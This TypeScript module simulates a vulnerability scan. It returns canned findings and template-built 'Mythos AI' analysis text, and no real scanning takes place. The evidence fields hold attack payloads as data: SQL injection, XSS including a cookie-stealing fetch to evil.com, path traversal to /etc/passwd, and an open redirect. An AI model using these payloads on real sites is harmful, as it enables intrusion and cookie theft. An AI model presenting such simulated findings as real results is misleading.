import type { VaptFinding, VaptScan, ScanCategory, FindingSeverity } from '../types';

// ── Finding databases per category ──────────────────────────────

const FINDING_DB: Record<ScanCategory, Omit<VaptFinding, 'id' | 'endpoint'>[]> = {
  'sql-injection': [
    {
      severity: 'critical',
      title: 'SQL Injection via Login Form',
      description: 'The username parameter in the authentication endpoint is not properly sanitised, allowing an attacker to manipulate the SQL query.',
      evidence: "POST /login — payload: ' OR 1=1 -- → HTTP 200 with admin session cookie",
      recommendation: 'Use parameterised queries / prepared statements. Never concatenate user input into SQL strings.',
      cve: 'CWE-89',
    },
    {
      severity: 'high',
      title: 'Blind SQL Injection in Search',
      description: 'Time-based blind SQLi detected in the `q` query parameter. Attacker can enumerate the entire database schema.',
      evidence: "GET /search?q=foo' AND SLEEP(5)-- → response time ≈ 5 s",
      recommendation: 'Sanitise all query parameters through an ORM or parameterised queries.',
      cve: 'CWE-89',
    },
    {
      severity: 'medium',
      title: 'Verbose SQL Error Messages',
      description: 'Unhandled database exceptions expose table names and column structure in HTTP error responses.',
      evidence: "GET /product?id=abc → 500 response body: 'Table: products, Column: product_id ...'",
      recommendation: 'Configure a global error handler to return generic messages in production.',
    },
  ],
  xss: [
    {
      severity: 'high',
      title: 'Reflected Cross-Site Scripting (XSS)',
      description: 'User-supplied input in the `name` parameter is echoed directly into the HTML response without encoding.',
      evidence: 'GET /greet?name=<script>alert(1)</script> → script executes in browser',
      recommendation: 'Apply context-aware output encoding (HTML entity encoding) for all reflected values.',
      cve: 'CWE-79',
    },
    {
      severity: 'high',
      title: 'Stored XSS in Comments',
      description: 'Malicious script stored in user comments is executed for every visitor viewing the page.',
      evidence: "POST /comment body=<img src=x onerror=fetch('//evil.com?c='+document.cookie)>",
      recommendation: 'Sanitise stored content server-side (e.g. DOMPurify / server-side HTML sanitiser).',
      cve: 'CWE-79',
    },
    {
      severity: 'medium',
      title: 'DOM-Based XSS via Fragment Identifier',
      description: 'Client-side JavaScript reads `location.hash` and writes it to innerHTML without sanitisation.',
      evidence: '/#<img src=1 onerror=alert(document.domain)> — payload executes client-side',
      recommendation: 'Never write location.hash or other URL fragments directly to the DOM; use textContent.',
    },
  ],
  csrf: [
    {
      severity: 'high',
      title: 'Missing CSRF Token on State-Changing Requests',
      description: 'POST endpoints that modify user data do not require a CSRF token, making users vulnerable to cross-site request forgery.',
      evidence: 'POST /account/email — no CSRF token required; forged form submits successfully from attacker origin.',
      recommendation: 'Implement synchronised CSRF tokens (SameSite=Strict cookies + server-side token validation).',
      cve: 'CWE-352',
    },
    {
      severity: 'medium',
      title: 'SameSite Cookie Attribute Not Set',
      description: 'Session cookie lacks the SameSite attribute, allowing it to be sent in cross-origin requests.',
      evidence: "Set-Cookie: session=xyz; Path=/; HttpOnly — SameSite attribute absent",
      recommendation: "Set SameSite=Strict or SameSite=Lax on all authentication cookies.",
    },
  ],
  'ssl-tls': [
    {
      severity: 'critical',
      title: 'TLS 1.0 / 1.1 Supported (POODLE / BEAST)',
      description: 'The server accepts TLS 1.0 and 1.1 which are deprecated and vulnerable to downgrade attacks.',
      evidence: 'TLS handshake completed with TLS 1.0 cipher: TLS_RSA_WITH_RC4_128_SHA',
      recommendation: 'Disable TLS 1.0 and 1.1; enforce TLS 1.2 minimum (TLS 1.3 preferred).',
      cve: 'CVE-2014-3566',
    },
    {
      severity: 'high',
      title: 'Weak Cipher Suites Enabled',
      description: 'Server supports export-grade and RC4 cipher suites that can be broken by an attacker.',
      evidence: 'Accepted: TLS_RSA_EXPORT_WITH_RC4_40_MD5, TLS_RSA_WITH_RC4_128_MD5',
      recommendation: 'Configure cipher suites to prefer ECDHE-based suites and disable NULL, RC4, and EXPORT suites.',
    },
    {
      severity: 'medium',
      title: 'HTTP Strict Transport Security (HSTS) Not Enforced',
      description: 'The server does not send an HSTS header, allowing attackers to downgrade HTTPS connections to HTTP.',
      evidence: 'Response headers contain no Strict-Transport-Security header.',
      recommendation: 'Add: Strict-Transport-Security: max-age=31536000; includeSubDomains; preload',
    },
  ],
  auth: [
    {
      severity: 'critical',
      title: 'Brute-Force Possible — No Account Lockout',
      description: 'The login endpoint has no rate-limiting or account lockout, allowing unlimited password guesses.',
      evidence: '1000 login attempts in 60 s — no lockout, no CAPTCHA, no 429 response.',
      recommendation: 'Implement progressive delays, CAPTCHA after N failures, and account lockout policies.',
    },
    {
      severity: 'high',
      title: 'Insecure Password Reset Flow',
      description: 'Password reset tokens are short (6 digits), predictable, and do not expire.',
      evidence: 'Reset token "123456" accepted 48 hours after issuance.',
      recommendation: 'Use cryptographically secure random tokens (≥128 bits), expire them within 15 minutes, and invalidate after use.',
      cve: 'CWE-640',
    },
    {
      severity: 'high',
      title: 'Session Not Invalidated on Logout',
      description: 'After logout the session token remains valid server-side, allowing session replay attacks.',
      evidence: 'POST /logout → 200. Re-sending old session token to GET /dashboard → 200 with user data.',
      recommendation: 'Invalidate the session server-side on logout and clear the session cookie.',
    },
    {
      severity: 'medium',
      title: 'Weak Default Credentials',
      description: 'Admin account accessible with factory default credentials admin/admin.',
      evidence: 'POST /admin/login with admin:admin → 200 OK with admin dashboard.',
      recommendation: 'Force credential change on first login; block known default credential pairs.',
    },
  ],
  headers: [
    {
      severity: 'medium',
      title: 'Content Security Policy (CSP) Not Present',
      description: 'No CSP header returned, making the application susceptible to XSS and data injection attacks.',
      evidence: 'HTTP response headers contain no Content-Security-Policy.',
      recommendation: "Deploy a restrictive CSP: Content-Security-Policy: default-src 'self'; script-src 'self'",
    },
    {
      severity: 'medium',
      title: 'X-Content-Type-Options Missing',
      description: 'Browser MIME-type sniffing not disabled; attacker-controlled file uploads could be executed as scripts.',
      evidence: 'Response headers contain no X-Content-Type-Options header.',
      recommendation: 'Add: X-Content-Type-Options: nosniff',
    },
    {
      severity: 'low',
      title: 'X-Frame-Options Not Set',
      description: 'Page can be embedded in an iframe on a third-party domain, enabling clickjacking.',
      evidence: 'Response headers contain no X-Frame-Options or frame-ancestors CSP directive.',
      recommendation: 'Add: X-Frame-Options: DENY  (or use CSP frame-ancestors directive).',
      cve: 'CWE-1021',
    },
    {
      severity: 'low',
      title: 'Server Version Disclosure',
      description: 'The Server header reveals the exact software version, reducing attacker effort for known-exploit targeting.',
      evidence: 'Server: Apache/2.4.49 (Ubuntu)',
      recommendation: "Set ServerTokens Prod in Apache config to suppress version disclosure.",
    },
    {
      severity: 'info',
      title: 'Referrer-Policy Not Configured',
      description: 'No Referrer-Policy header; sensitive URL parameters may leak to third parties via Referer header.',
      evidence: 'Referrer-Policy header absent on all responses.',
      recommendation: "Add: Referrer-Policy: strict-origin-when-cross-origin",
    },
  ],
  'open-redirect': [
    {
      severity: 'medium',
      title: 'Open Redirect in Login Redirect Parameter',
      description: 'The `next` parameter on the login endpoint is not validated against an allowlist, enabling phishing redirects.',
      evidence: 'GET /login?next=https://evil.com → after login: 302 Location: https://evil.com',
      recommendation: 'Validate redirect targets against a strict allowlist of internal paths only.',
      cve: 'CWE-601',
    },
    {
      severity: 'low',
      title: 'Unvalidated Forward in Account Settings',
      description: 'Server-side forward to a URL derived from user input could expose internal resources.',
      evidence: "POST /settings with redirect_to=http://internal-admin/ → internal admin page returned",
      recommendation: 'Never forward requests to user-supplied URLs server-side without strict validation.',
    },
  ],
  'file-inclusion': [
    {
      severity: 'critical',
      title: 'Local File Inclusion (LFI)',
      description: 'The `page` parameter is passed directly to a file inclusion function, allowing traversal to sensitive files.',
      evidence: "GET /index.php?page=../../../../etc/passwd → file contents returned in response",
      recommendation: 'Use a whitelist of allowed page identifiers; never pass raw user input to include/require.',
      cve: 'CWE-22',
    },
    {
      severity: 'high',
      title: 'Path Traversal in File Download',
      description: 'Download endpoint allows `../` sequences to escape the intended directory.',
      evidence: "GET /download?file=../../config/database.yml → database credentials returned",
      recommendation: 'Resolve and canonicalise paths; verify they start with the expected base directory.',
      cve: 'CWE-22',
    },
  ],
  'full-scan': [],   // populated dynamically by combining all categories
};

// ── Mythos AI analysis templates ─────────────────────────────────

const MYTHOS_ANALYSIS_TEMPLATES = [
  (critical: number, high: number, total: number, url: string) =>
    `Mythos AI completed deep-scan analysis of ${url}. Identified ${total} vulnerability instances across the attack surface. ` +
    `${critical > 0 ? `⚠️ ${critical} CRITICAL finding${critical > 1 ? 's' : ''} require immediate remediation — active exploitation risk is HIGH. ` : ''}` +
    `${high > 0 ? `${high} HIGH-severity issue${high > 1 ? 's' : ''} should be patched within the next sprint. ` : ''}` +
    `Attack vectors include injection flaws and broken access controls. Recommend enabling WAF rules and scheduling a re-scan within 7 days post-fix.`,
  (critical: number, high: number, total: number, url: string) =>
    `[Mythos AI] Security posture assessment for ${url}: ${total} weakness${total !== 1 ? 'es' : ''} detected. ` +
    `Risk score: ${critical * 25 + high * 15}/100. ` +
    `Priority remediation path: address authentication bypasses → input validation → security header hardening. ` +
    `Estimated remediation effort: ${total < 3 ? 'low (< 1 day)' : total < 6 ? 'medium (2–3 days)' : 'high (1–2 weeks)'}.`,
  (critical: number, high: number, total: number, url: string) =>
    `Mythos AI Deep-Scan Report — ${url}\n` +
    `Total findings: ${total} | Critical: ${critical} | High: ${high} | Others: ${total - critical - high}\n` +
    `The application exhibits patterns consistent with OWASP Top-10 categories A01 (Broken Access Control) and A03 (Injection). ` +
    `Immediate action required on findings rated CRITICAL. Schedule developer security training focused on secure coding for injection prevention.`,
];

// ── Helpers ───────────────────────────────────────────────────────

let _findingCounter = 0;
function makeId(): string {
  return `f-${Date.now()}-${++_findingCounter}`;
}

function pickEndpoint(targetUrl: string, category: ScanCategory): string {
  const base = targetUrl.replace(/\/$/, '');
  const endpointMap: Record<ScanCategory, string[]> = {
    'sql-injection': ['/login', '/search', '/products', '/api/users'],
    xss: ['/comments', '/search', '/profile', '/api/feedback'],
    csrf: ['/account/email', '/settings', '/api/transfer'],
    'ssl-tls': [base, `${base}:443`],
    auth: ['/login', '/forgot-password', '/logout', '/admin'],
    headers: ['/', '/api/', '/dashboard'],
    'open-redirect': ['/login', '/settings/redirect', '/oauth/callback'],
    'file-inclusion': ['/index.php', '/download', '/view'],
    'full-scan': ['/'],
  };
  const paths = endpointMap[category] ?? ['/'];
  return base + paths[Math.floor(Math.random() * paths.length)];
}

// Subset of findings to make each scan feel different
function sampleFindings(
  category: ScanCategory,
  targetUrl: string,
  count: number
): VaptFinding[] {
  const pool =
    category === 'full-scan'
      ? (Object.keys(FINDING_DB) as ScanCategory[])
          .filter((k) => k !== 'full-scan')
          .flatMap((k) => FINDING_DB[k])
      : FINDING_DB[category] ?? [];

  // Shuffle deterministically for the given URL to keep re-runs consistent
  const seed = targetUrl.split('').reduce((a, c) => a + c.charCodeAt(0), 0);
  const shuffled = [...pool].sort((a, b) => {
    const ha = (a.title.charCodeAt(0) + seed) % 97;
    const hb = (b.title.charCodeAt(0) + seed) % 97;
    return ha - hb;
  });

  return shuffled.slice(0, Math.min(count, shuffled.length)).map((f) => ({
    ...f,
    id: makeId(),
    endpoint: pickEndpoint(targetUrl, category),
  }));
}

// ── Public API ────────────────────────────────────────────────────

/** Resolve the number of findings to simulate for a category. */
function findingCount(category: ScanCategory): number {
  if (category === 'full-scan') return 8;
  return FINDING_DB[category]?.length ?? 3;
}

/**
 * Simulate a VAPT scan.
 * Calls `onProgress` with progress 0→100 and partial finding lists.
 * Calls `onComplete` with full findings and Mythos AI analysis text.
 */
export function runMythosScan(
  scan: VaptScan,
  onProgress: (progress: number, partialFindings: VaptFinding[]) => void,
  onComplete: (findings: VaptFinding[], analysis: string) => void,
  onError: (message: string) => void
): () => void {
  let cancelled = false;

  (async () => {
    try {
      const totalFindings = findingCount(scan.category);
      const allFindings = sampleFindings(scan.category, scan.targetUrl, totalFindings);
      const revealed: VaptFinding[] = [];
      const totalSteps = allFindings.length + 2; // +2 for init and analysis steps

      // Step 0 – initialise
      onProgress(5, []);
      await delay(600);
      if (cancelled) return;

      // Gradually reveal findings
      for (let i = 0; i < allFindings.length; i++) {
        if (cancelled) return;
        const stepProgress = Math.round(10 + ((i + 1) / totalSteps) * 75);
        revealed.push(allFindings[i]);
        onProgress(stepProgress, [...revealed]);
        await delay(450 + Math.random() * 350);
      }

      if (cancelled) return;

      // Final analysis step
      onProgress(92, [...revealed]);
      await delay(900);
      if (cancelled) return;

      // Build Mythos AI analysis
      const critical = revealed.filter((f) => f.severity === 'critical').length;
      const high = revealed.filter((f) => f.severity === 'high').length;
      const tpl = MYTHOS_ANALYSIS_TEMPLATES[Math.floor(Math.random() * MYTHOS_ANALYSIS_TEMPLATES.length)];
      const analysis = tpl(critical, high, revealed.length, scan.targetUrl);

      onProgress(100, [...revealed]);
      onComplete([...revealed], analysis);
    } catch (err) {
      if (!cancelled) onError(String(err));
    }
  })();

  return () => { cancelled = true; };
}

function delay(ms: number): Promise<void> {
  return new Promise((res) => setTimeout(res, ms));
}

export const SCAN_CATEGORY_LABELS: Record<string, string> = {
  'sql-injection': 'SQL Injection',
  xss: 'Cross-Site Scripting (XSS)',
  csrf: 'CSRF',
  'ssl-tls': 'SSL / TLS',
  auth: 'Authentication',
  headers: 'Security Headers',
  'open-redirect': 'Open Redirect',
  'file-inclusion': 'File Inclusion',
  'full-scan': 'Full Scan (All Categories)',
};

export const SEVERITY_ORDER: Record<FindingSeverity, number> = {
  critical: 0,
  high: 1,
  medium: 2,
  low: 3,
  info: 4,
};
